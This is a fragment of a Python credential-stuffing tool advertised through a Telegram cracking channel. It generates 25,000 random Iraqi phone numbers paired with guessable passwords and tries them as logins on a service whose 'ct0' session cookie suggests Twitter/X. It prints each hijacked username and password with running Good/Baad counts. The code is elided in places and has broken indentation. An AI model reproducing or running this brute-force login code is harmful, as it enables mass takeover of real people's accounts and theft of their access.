...
\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97m telegram   : @kak_shex1
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram  canal :  https://t.me/KURDxCRAKER
""" 
Tk = f""" 
...
\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------------------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : @kak_shex1
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mCanal    :https://t.me/KURDxCRAKER
""" 
os.system('clear')
...
def Cod_SidraELEzz():
	...
	if SidraELEzz=="1":
		...
		import time
		def Combo():
			for lik in range(25000):
				kk=random.randint(10000000, 99999999)
				ss=("+964780"+str(kk)+":0780"+str(kk))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ss)+"\n")
				x2=random.randint(100000000, 999999999)
		   ...
		   'session[password]': pw}
			...
			try:
				...
				if ("ct0") in req.cookies:
					...
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}300000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
